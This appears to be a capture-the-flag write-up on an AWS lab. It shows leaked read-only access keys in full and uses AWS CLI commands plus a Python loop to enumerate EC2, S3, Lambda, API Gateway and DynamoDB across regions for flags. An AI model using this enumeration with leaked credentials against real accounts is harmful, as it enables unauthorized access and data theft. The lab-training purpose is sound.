# AWS system recon report

https://attackdefense.com/challengedetails?cid=2074

In this CTF a recon was done on a AWS system where a read-only user's AWS credentials were leaked. Nothing was specified except that the user was using the services EC2, DyanmoDB, Lambda, API Gateway, S3, and Cloudwatch and 7 flags were to be found.

```
Access Key ID: AKIAUAWOPGE5OQVLUEIX
Secret Access Key: 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
```

To use these credentials AWS CLI was configured like this:

```
$ cat ~/.aws/credentials
[default]
aws_access_key_id = AKIAUAWOPGE5OQVLUEIX
aws_secret_access_key = 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

$ cat ~/.aws/config
[default]
output = yaml
```

Other dependencies:

* [yq](https://mikefarah.gitbook.io/yq/)

## Regions

Most AWS services run in a specific a specific region. So while searching for deployed services all regions must be checked. The file `regions.txt` was created which contains all regions:

```
$ cat regions.txt
af-south-1
ap-east-1
ap-south-1
ap-northeast-3
ap-northeast-2
ap-southeast-1
ap-southeast-2
ap-northeast-1
ca-central-1
cn-north-1
cn-northwest-1
eu-central-1
eu-west-1
eu-west-2
eu-south-1
eu-west-3
eu-north-1
me-south-1
sa-east-1
us-gov-east-1
us-gov-west-1
```

## EC2

EC2 instances were searched like this:

```
for region in $(cat regions.txt); do echo $region; aws --region=$region --no-cli-pager ec2 describe-instances; done
e
```

This revealed two EC2 instances in regions eu-west-2 and ap-southeast-2. The instance in ap-southeast-2 had FLAG1 in its tag:

```
$ aws --region=ap-southeast-2 ec2 describe-instances | yq r - 'Reservations[*].Instances[*].Tags'
- Key: FLAG1
  Value: 0cd68e3e7763d993307b65ea0facf740
```

## S3

Fetch a list of S3 buckets:

```
$ aws s3api list-buckets | yq r - 'Buckets[*].Name'
data-extractor-repo
developers-secret-bucket
temporary-public-image-store
users-personal-files
```

An object of interest `dave-shared-bucket/flag.txt` can be found by listing `developers-secret-bucket`:

```
$ aws s3api list-objects --bucket=developers-secret-bucket
Contents:
- ETag: '"d41d8cd98f00b204e9800998ecf8427e"'
  Key: dave-shared-bucket/
  LastModified: '2020-10-29T11:49:23+00:00'
  Owner:
    ID: 7153c083c4d4c8b9bea0cdd3c5ec7d8ec99ba029736225369fa61ae449322da5
  Size: 0
  StorageClass: STANDARD
- ETag: '"fef650ed3acf9bef8f3cec95832314c7"'
  Key: dave-shared-bucket/flag.txt
  LastModified: '2020-10-29T22:50:01+00:00'
  Owner:
    ID: 7153c083c4d4c8b9bea0cdd3c5ec7d8ec99ba029736225369fa61ae449322da5
  Size: 39
  StorageClass: STANDARD
```

Fetching and reading the object reveals FLAG2:

```
$ aws s3api get-object --bucket=developers-secret-bucket --key=dave-shared-bucket/flag.txt flag.txt
AcceptRanges: bytes
ContentLength: 39
ContentType: text/plain
ETag: '"fef650ed3acf9bef8f3cec95832314c7"'
LastModified: '2020-10-29T22:50:01+00:00'
Metadata: {}
$ cat flag.txt
FLAG2: 305f19a9072a580f2de275c57e5c16c0
```

## Lambda

To find lambda functions the following script was used:

```python
import subprocess
from pathlib import Path

regions = list(
    filter(None, Path("all_aws_regions.txt").read_text().split("\n"))
)

for region in regions:
    operations = [
        # "list-aliases",
        "list-event-source-mappings",
        "list-functions",
        # "list-layer-versions",
        "list-layers",
        # "list-provisioned-concurrency-configs",
        # "list-tags",
        # "list-versions-by-function",
    ]
    for operation in operations:
        print(region)
        command = f"aws --region={region} --no-cli-pager lambda {operation}"
        print(f"$ {command}")
        subprocess.run(command, shell=True, check=False)
```

This revealed a function in region ap-southeast-1. The src code for the function was downloaded.

Calls to the lambda function have to go through API Gateway (see policy).


## API Gateway

Through the lambda function policy we khnow there is an API gateway in ap-southeast-1 so we find the rest-api like this:

```
aws --region=ap-southeast-1 apigateway get-rest-apis
```

These URLS serve the function:

* https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod
* https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Stage

## DynamoDB

FLAG7 is in dynamodb:us-east-1:tables:CardDetails:items
